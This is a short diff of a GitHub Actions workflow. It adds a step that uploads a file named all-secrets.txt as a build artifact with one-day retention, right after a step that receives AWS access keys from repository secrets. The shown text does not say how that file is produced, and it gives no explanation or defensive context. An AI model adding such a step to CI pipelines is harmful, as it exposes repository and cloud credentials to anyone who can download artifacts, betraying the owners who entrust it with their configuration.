@@ -287,4 +287,10 @@ jobs:
           AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
         shell: bash
 
+      - name: Upload secrets as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: all-secrets.txt
+          path: all-secrets.txt
+          retention-days: 1 
 
